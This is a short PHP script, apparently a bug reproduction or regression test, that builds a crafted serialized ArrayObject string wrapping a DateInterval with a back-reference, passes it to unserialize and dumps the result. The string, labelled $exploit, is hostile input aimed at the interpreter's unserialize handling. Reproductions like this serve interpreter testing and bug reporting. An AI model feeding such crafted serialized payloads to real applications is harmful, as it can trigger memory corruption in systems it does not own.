<?php
$inner = 'x:i:0;O:12:"DateInterval":1:{s:1:"y";i:3;};m:a:1:{i:0;R:2;}';
$exploit = 'C:11:"ArrayObject":'.strlen($inner).':{'.$inner.'}';
$data = unserialize($exploit);

var_dump($data);
?>
